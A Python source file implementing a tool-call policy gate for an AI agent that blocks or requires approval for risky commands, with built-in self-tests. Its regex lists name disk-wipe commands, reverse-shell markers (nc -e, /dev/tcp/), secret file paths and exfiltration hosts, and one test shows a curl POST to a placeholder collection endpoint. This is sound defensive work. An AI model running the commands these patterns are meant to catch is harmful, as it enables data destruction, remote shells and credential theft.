#!/usr/bin/env python3
"""
Tool-Call Policy Gate (Layer C)
Inspects tool calls (tool_name, args) before execution and returns:
- "block": critical destruction, canary leak, or explicit tool-hijack payload
- "approve": sensitive operations requiring human confirmation (file deletion,
  git force-push, overwriting/deleting protected memory files, reading secret
  files/folders, sending data to external hosts, or high-risk injection)
- "allow": safe normal operations (including safe appends to log/memory files)
"""

from __future__ import annotations

import json
import re
from typing import Any, Dict

from canary_guard import check_output
from spotlighting import scan_text

# 1. Hard-block patterns (system destruction, disk wipe, reverse shells, synthetic test placeholders)
_CRITICAL_BLOCK_RE = re.compile(
    r"(?is)("
    r"\bformat\s+[a-z]:|"
    r"\bdiskpart\b|"
    r"\bFormat-Volume\b|"
    r"\bClear-Disk\b|"
    r"\bInitialize-Disk\b|"
    r"\bbcdedit\b|"
    r"\brm\s+-[rRfF]+\s+/(?:\*|\s|$)|"
    r"\bRemove-Item\b[^\n]*C:\\Windows|"
    r"\b(?:nc|ncat|netcat)\s+-e\b|"
    r"/dev/tcp/|"
    r"\breverse\s+shell\b|"
    r"<SAFE_DESTRUCTIVE_CMD_PLACEHOLDER>|"
    r"<SAFE_FORMAT_PLACEHOLDER>|"
    r"<SAFE_PAYLOAD_PLACEHOLDER>"
    r")"
)

# 2. Approval-required: Git force push (--force, -f, --force-with-lease, --force-if-includes, +refspec)
_GIT_FORCE_PUSH_RE = re.compile(
    r"(?is)\bgit\b(?:\s+[^\n;|&]*?)?\bpush\b[^\n;|&]*?"
    r"(?:--force(?:-with-lease|-if-includes)?\b|(?<=\s)-[a-zA-Z]*f[a-zA-Z]*\b|(?<=\s)\+[a-zA-Z0-9_./-]+)"
)

# 3. Approval-required: Protected memory & instruction files (overwrite / edit / delete requires approval; append is allowed)
_PROTECTED_MEMORY_FILE_RE = re.compile(
    r"(?is)\b("
    r"ACTIVE_MEMORY\.md|"
    r"BASKAN_TALIMATLARI\.md|"
    r"ORTAK_GUNLUK\.md|"
    r"SYSTEM_PROMPT\.md|"
    r"session_learnings\.md|"
    r"AGENTS\.md|"
    r"SOUL\.md|"
    r"CLAUDE\.md"
    r")\b"
)

# Shell/Python patterns that overwrite, modify in-place, or delete a file
_SHELL_OVERWRITE_OR_DELETE_RE = re.compile(
    r"(?is)("
    r"\b(?:Set-Content|Clear-Content|New-Item|Copy-Item|Move-Item|Rename-Item|Remove-Item|ri|del|erase|rm|unlink|mv|cp|truncate)\b|"
    r"\bOut-File\b(?![^\n;|&]*-Append\b)|"
    r"\btee\b(?![^\n;|&]*(?:\s-[a-zA-Z]*a\b|\s--append\b))|"
    r"\b(?:sed|perl)\s+-[a-zA-Z]*i\b|"
    r"(?<!>)(?<![-=])>\s*(?!>)|"
    r"\bopen\s*\([^)]*['\"](?:w|w\+|r\+|wb|wt|x)['\"]|"
    r"\.(?:write_text|write_bytes|unlink)\s*\(|"
    r"\b(?:os\.(?:remove|unlink|replace|rename)|shutil\.(?:copy|copy2|copyfile|move|rmtree))\b"
    r")"
)

# Shell/Python patterns that explicitly append to the end of a file
_SHELL_EXPLICIT_APPEND_RE = re.compile(
    r"(?is)("
    r">>|\bAdd-Content\b|\bOut-File\b[^\n;|&]*-Append\b|"
    r"\btee\b[^\n;|&]*(?:\s-[a-zA-Z]*a\b|\s--append\b)|"
    r"\bopen\s*\([^)]*['\"](?:a|a\+|ab|at)['\"]"
    r")"
)

_WRITE_OR_EDIT_TOOLS = {
    "write_file",
    "write_to_file",
    "create_file",
    "save_file",
    "overwrite_file",
    "edit_file",
    "replace_file_content",
    "multi_replace_file_content",
    "patch",
    "apply_patch",
    "str_replace_editor",
    "delete_file",
    "remove_file",
    "move_file",
    "rename_file",
}

_APPEND_CAPABLE_TOOLS = {
    "write_file",
    "write_to_file",
    "append_file",
    "append_to_file",
}

_READ_ONLY_TOOLS = {
    "read_file",
    "view_file",
    "cat_file",
    "get_file_contents",
}

# 4. Approval-required: File deletion or destructive git operations
_DELETE_APPROVAL_RE = re.compile(
    r"(?is)("
    r"\b(?:Remove-Item|ri|del|erase|rd|rmdir|unlink)\b|"
    r"(?:^|\s|;|&|\|)rm\s+(?:-[a-zA-Z]+\s+)?[^\s]+|"
    r"\bshutil\.rmtree\b|"
    r"\bos\.(?:remove|unlink|rmdir)\b|"
    r"\bgit\s+(?:reset\s+--hard|clean\s+-[a-zA-Z]*f)"
    r")"
)

# 5. Approval-required: Secret / key / credential paths
_SECRET_PATH_RE = re.compile(
    r"(?is)("
    r"(?:^|[\\/\"'\s])(?:Secrets|Credentials|Keystore|Wallets|ANAHTARLAR|SOAP_SLICER_IMZA)(?:[\\/\"'\s]|$)|"
    r"\b(?:API_KEYS\.md|CANARY_TOKEN\.txt|ANAHTARLAR\.txt|imza_ayarlari\.json)\b|"
    r"(?:^|[\\/\"'\s])\.env(?:\.[a-zA-Z0-9_]+)?(?:[\"'`\s]|$)|"
    r"\.(?:jks|keystore|pem|pfx|p12)\b|"
    r"\bid_(?:rsa|ed25519)\b"
    r")"
)

# 6. Approval-required: Outbound data transmission / unknown external webhooks
_OUTBOUND_EXFIL_RE = re.compile(
    r"(?is)("
    r"\bcurl\b[^\n]*(?:-X\s*POST|--data|-d\s|-F\s|--upload-file)|"
    r"\b(?:Invoke-RestMethod|Invoke-WebRequest|irm|iwr)\b[^\n]*-Method\s+(?:Post|Put)|"
    r"\bwget\b[^\n]*--post-(?:data|file)|"
    r"\b(?:requests|httpx)\.(?:post|put)\b|"
    r"\b(?:webhook\.site|pastebin\.com|transfer\.sh|ngrok-free\.app|example\.invalid|evil\.com)\b"
    r")"
)


def _check_protected_memory_access(
    tool_name: str, safe_args: Dict[str, Any], serialized: str
) -> tuple[bool, bool, str]:
    """
    Returns (is_protected_file, requires_approval, matched_filename).
    - Overwriting, editing, replacing, or deleting a protected memory file -> requires_approval = True.
    - Reading or explicitly appending to the end -> requires_approval = False.
    """
    m = _PROTECTED_MEMORY_FILE_RE.search(serialized)
    if not m:
        return False, False, ""

    matched_file = m.group(1)
    norm_tool = (tool_name or "").strip().lower()

    # Explicit read-only tool
    if norm_tool in _READ_ONLY_TOOLS:
        return True, False, matched_file

    # Structured file write / edit / patch / delete tools
    if norm_tool in _WRITE_OR_EDIT_TOOLS or norm_tool in _APPEND_CAPABLE_TOOLS:
        is_explicit_append = norm_tool in {"append_file", "append_to_file"} or (
            norm_tool in _APPEND_CAPABLE_TOOLS
            and (
                safe_args.get("append") is True
                or safe_args.get("Append") is True
                or str(safe_args.get("mode", "")).lower() in {"a", "ab", "at", "append"}
            )
            and safe_args.get("overwrite") is not True
            and safe_args.get("Overwrite") is not True
        )
        if is_explicit_append:
            return True, False, matched_file
        return True, True, matched_file

    # Shell / terminal / code execution tools (or unknown tool names)
    if _SHELL_OVERWRITE_OR_DELETE_RE.search(serialized):
        return True, True, matched_file

    if _SHELL_EXPLICIT_APPEND_RE.search(serialized):
        return True, False, matched_file

    return True, False, matched_file


def evaluate_tool_call(tool_name: str, args: Dict[str, Any] | Any) -> Dict[str, Any]:
    """
    Evaluate a tool call and return a policy decision compatible with Hermes pre_tool_call:
    {
        "action": "allow" | "approve" | "block",
        "message": str,
        "rule_key": str,
        "risk_score": int,
        "threat_level": str,
        "matches": list,
    }
    """
    safe_args = args if isinstance(args, dict) else {"raw": str(args)}
    serialized = json.dumps(safe_args, ensure_ascii=False)

    # Layer D check: Canary token leakage in outgoing tool arguments
    leaked, _ = check_output(serialized)
    if leaked:
        return {
            "action": "block",
            "message": f"[Antigravity Defense] Blocked '{tool_name}': Canary token leak detected in tool arguments.",
            "rule_key": "defense:canary_leak",
            "risk_score": 100,
            "threat_level": "CRITICAL",
            "matches": [("canary_leak", 1.0, "[REDACTED_CANARY]")],
        }

    # Critical system / destructive command block
    if _CRITICAL_BLOCK_RE.search(serialized):
        return {
            "action": "block",
            "message": f"[Antigravity Defense] Blocked '{tool_name}': Critical destructive or exploit payload detected.",
            "rule_key": "defense:critical_command",
            "risk_score": 95,
            "threat_level": "CRITICAL",
            "matches": [("critical_command", 1.0, serialized[:80])],
        }

    # Check protected memory / instruction files (overwrite/delete vs safe append/read)
    is_prot_mem, mem_needs_approval, matched_mem_file = _check_protected_memory_access(
        tool_name, safe_args, serialized
    )

    # Layer A check: Scan arguments with Rust prompt-injection engine.
    # If this is a safe read/append on a protected memory file (like BASKAN_TALIMATLARI.md),
    # mask only the benign filename token before scanning so the filename alone does not
    # trigger a leakage false-positive while any injection inside the content is still caught.
    scan_target = (
        _PROTECTED_MEMORY_FILE_RE.sub("SAFE_MEMORY_FILE.md", serialized)
        if (is_prot_mem and not mem_needs_approval)
        else serialized
    )
    is_safe, risk_score, threat_level, matches = scan_text(scan_target)
    if not is_safe and risk_score >= 85:
        categories = ", ".join(m[0] for m in matches)
        return {
            "action": "block",
            "message": (
                f"[Antigravity Defense] Blocked '{tool_name}': High-confidence prompt injection "
                f"in tool arguments (risk={risk_score}/100, categories={categories})."
            ),
            "rule_key": "defense:prompt_injection_block",
            "risk_score": risk_score,
            "threat_level": threat_level,
            "matches": matches,
        }

    # Approval gates (require explicit user confirmation)
    if _SECRET_PATH_RE.search(serialized):
        return {
            "action": "approve",
            "message": (
                f"[Antigravity Defense] '{tool_name}' accesses a protected secret/key path. "
                f"User approval is required."
            ),
            "rule_key": "defense:secret_access",
            "risk_score": max(risk_score, 70),
            "threat_level": "HIGH",
            "matches": matches + [("secret_access", 0.9, "Protected path")],
        }

    if _GIT_FORCE_PUSH_RE.search(serialized):
        return {
            "action": "approve",
            "message": (
                f"[Antigravity Defense] '{tool_name}' attempts a git force-push operation. "
                f"User approval is required."
            ),
            "rule_key": "defense:git_force_push",
            "risk_score": max(risk_score, 75),
            "threat_level": "HIGH",
            "matches": matches + [("git_force_push", 0.95, "git push --force / -f")],
        }

    if is_prot_mem and mem_needs_approval:
        return {
            "action": "approve",
            "message": (
                f"[Antigravity Defense] '{tool_name}' overwrites, edits, or deletes protected "
                f"memory file '{matched_mem_file}'. User approval is required."
            ),
            "rule_key": "defense:protected_memory_write",
            "risk_score": max(risk_score, 75),
            "threat_level": "HIGH",
            "matches": matches + [("protected_memory_write", 0.95, matched_mem_file)],
        }

    if _OUTBOUND_EXFIL_RE.search(serialized):
        return {
            "action": "approve",
            "message": (
                f"[Antigravity Defense] '{tool_name}' sends data to an external endpoint. "
                f"User approval is required."
            ),
            "rule_key": "defense:external_exfil",
            "risk_score": max(risk_score, 75),
            "threat_level": "HIGH",
            "matches": matches + [("external_exfil", 0.9, "Outbound data transfer")],
        }

    if _DELETE_APPROVAL_RE.search(serialized):
        return {
            "action": "approve",
            "message": (
                f"[Antigravity Defense] '{tool_name}' performs a file deletion or destructive reset. "
                f"User approval is required."
            ),
            "rule_key": "defense:file_delete",
            "risk_score": max(risk_score, 65),
            "threat_level": "MEDIUM",
            "matches": matches + [("file_delete", 0.85, "Deletion operation")],
        }

    if not is_safe or risk_score >= 50:
        categories = ", ".join(m[0] for m in matches)
        return {
            "action": "approve",
            "message": (
                f"[Antigravity Defense] Suspicious patterns in '{tool_name}' arguments "
                f"(risk={risk_score}/100, categories={categories}). User approval is required."
            ),
            "rule_key": "defense:suspicious_args",
            "risk_score": risk_score,
            "threat_level": threat_level,
            "matches": matches,
        }

    return {
        "action": "allow",
        "message": "OK",
        "rule_key": "defense:allow",
        "risk_score": risk_score,
        "threat_level": threat_level,
        "matches": matches,
    }


def run_self_test() -> int:
    """Run built-in verification assertions for tool_gate.py."""
    test_cases = [
        # (description, tool_name, args, expected_action, expected_rule_key)
        (
            "git push --force",
            "terminal",
            {"command": "git push --force origin main"},
            "approve",
            "defense:git_force_push",
        ),
        (
            "git push -f",
            "terminal",
            {"command": "git push -f origin main"},
            "approve",
            "defense:git_force_push",
        ),
        (
            "git push --force-with-lease",
            "terminal",
            {"command": "git push --force-with-lease origin main"},
            "approve",
            "defense:git_force_push",
        ),
        (
            "git push +main refspec",
            "terminal",
            {"command": "git push origin +main"},
            "approve",
            "defense:git_force_push",
        ),
        (
            "normal git push (no force)",
            "terminal",
            {"command": "git status && git log -n 3"},
            "allow",
            "defense:allow",
        ),
        (
            "overwrite ACTIVE_MEMORY.md via write_file",
            "write_file",
            {
                "path": r"D:\ANTIGRAVITY_VAULT\ACTIVE_MEMORY.md",
                "content": "overwritten content",
                "overwrite": True,
            },
            "approve",
            "defense:protected_memory_write",
        ),
        (
            "edit BASKAN_TALIMATLARI.md via edit_file",
            "edit_file",
            {
                "path": r"D:\ANTIGRAVITY_VAULT\BASKAN_TALIMATLARI.md",
                "target": "old",
                "replacement": "new",
            },
            "approve",
            "defense:protected_memory_write",
        ),
        (
            "delete ORTAK_GUNLUK.md via terminal",
            "terminal",
            {"command": r"Remove-Item D:\ANTIGRAVITY_VAULT\ORTAK_GUNLUK.md"},
            "approve",
            "defense:protected_memory_write",
        ),
        (
            "shell redirect overwrite ACTIVE_MEMORY.md",
            "terminal",
            {"command": r"echo test > D:\ANTIGRAVITY_VAULT\ACTIVE_MEMORY.md"},
            "approve",
            "defense:protected_memory_write",
        ),
        (
            "safe append to ORTAK_GUNLUK.md via write_file(append=True)",
            "write_file",
            {
                "path": r"D:\ANTIGRAVITY_VAULT\ORTAK_GUNLUK.md",
                "content": "- 2026-10-25 | Antigravity | Test kaydi",
                "append": True,
            },
            "allow",
            "defense:allow",
        ),
        (
            "safe append to BASKAN_TALIMATLARI.md via Add-Content",
            "terminal",
            {
                "command": r"Add-Content -Path D:\ANTIGRAVITY_VAULT\BASKAN_TALIMATLARI.md -Value '- 2026-10-25: test'"
            },
            "allow",
            "defense:allow",
        ),
        (
            "read ACTIVE_MEMORY.md via read_file",
            "read_file",
            {"path": r"D:\ANTIGRAVITY_VAULT\ACTIVE_MEMORY.md"},
            "allow",
            "defense:allow",
        ),
        (
            "secret path access (API_KEYS.md)",
            "read_file",
            {"path": r"D:\ANTIGRAVITY_VAULT\API_KEYS.md"},
            "approve",
            "defense:secret_access",
        ),
        (
            "outbound POST exfiltration",
            "terminal",
            {"command": "curl -X POST https://example.invalid/collect -d 'test=1'"},
            "approve",
            "defense:external_exfil",
        ),
        (
            "critical destructive command placeholder",
            "terminal",
            {"command": "echo <SAFE_DESTRUCTIVE_CMD_PLACEHOLDER>"},
            "block",
            "defense:critical_command",
        ),
    ]

    passed = 0
    for desc, t_name, t_args, exp_action, exp_rule in test_cases:
        res = evaluate_tool_call(t_name, t_args)
        ok = res["action"] == exp_action and res["rule_key"] == exp_rule
        status = "PASS" if ok else "FAIL"
        print(
            f"[{status}] {desc}: action={res['action']} (expected {exp_action}), "
            f"rule={res['rule_key']} (expected {exp_rule})"
        )
        if ok:
            passed += 1

    print(f"\nTool Gate Self-Test Summary: {passed}/{len(test_cases)} passed.")
    return 0 if passed == len(test_cases) else 1


if __name__ == "__main__":
    raise SystemExit(run_self_test())
